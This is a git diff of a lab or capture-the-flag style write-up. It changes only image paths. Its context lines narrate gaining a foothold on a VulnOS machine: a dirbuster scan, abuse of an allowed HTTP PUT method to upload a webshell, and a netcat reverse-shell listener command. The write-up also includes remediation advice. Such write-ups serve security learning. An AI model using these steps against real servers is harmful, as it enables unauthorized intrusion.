@@ -34,17 +34,17 @@ OS and Service detection performed. Please report any incorrect results at https
 
 **Initial Shell Vulnerability Exploited:** </br>
 Found /test directory with dirbuster directory fuzzing: </br>
-![dirbuster_scan](images/dirbuster_scan.png) </br>
+![dirbuster_scan](images/vulnos/dirbuster_scan.png) </br>
 Main Page was empty, I decided to check the HTTP permission methods on the server side, with
 Burpsuite: </br>
-![burpsuite_http_methods](burpsuite_http_methods) </br>
+![burpsuite_http_methods](images/vulnos/burpsuite_http_methods.png) </br>
 I replaced ‘GET’ with OPTIONS and I could see at the response some request methods that should have
 been disallowed, The most interesting one is the ‘PUT’ method: </br>
 ```**PUT** is used to send data to a server to create/update a resource, that means
 that we could upload files into the /test directory.``` </br>
 I uploaded a webshell: </br>
-![webshell_upload](images/webshell_upload.png) </br>
-![webshell_poc](images/webshell_poc.png) </br>
+![webshell_upload](images/vulnos/webshell_upload.png) </br>
+![webshell_poc](images/vulnos/webshell_poc.png) </br>
 I got a reverse shell with netcat: </br>
 ```bash
 Attacker side: nc -nlvp 443
@@ -64,7 +64,7 @@ If you need any insecure HTTP methods to be enabled on your server, make sure
 they are properly authorized and available only for specific resources. This
 way you’ll prevent any malicious usage of those. </br>
 **Initial Shell Screenshot:** </br>
-![initial_shell_poc](initial_shell_poc) </br>
+![initial_shell_poc](images/vulnos/initial_shell_poc.png) </br>
 
 # Privilege Escalation:
 just a test and writing some stuff </br>
